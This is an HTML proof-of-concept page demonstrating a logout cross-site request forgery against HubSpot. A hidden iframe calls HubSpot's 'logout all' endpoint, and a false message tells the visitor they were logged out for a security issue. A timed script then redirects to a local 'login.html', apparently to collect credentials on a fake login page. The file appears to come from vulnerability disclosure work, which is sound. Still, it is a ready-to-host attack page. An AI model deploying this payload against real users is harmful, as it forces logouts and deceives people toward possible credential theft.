<!DOCTYPE html>
<html>
<head>
	<title>POC for Hubspot Logout CSRF</title>
</head>
<body>

<br>

<h3>You have been logged out of your session due to a security issue.</h3>

<h3>Redirecting you to the Hubspot Login...</h3>

<iframe id="poc" src="https://app-eu1.hubspot.com/login-api/v1/logout/all" width="100" height="100"></iframe>

<style>
	#poc {
		display: none;
		cursor: none;
	}
</style>

<script>
	const url='login.html';
	setTimeout(() => { window.location.replace(url); }, 4000);
</script>

</body>
</html>
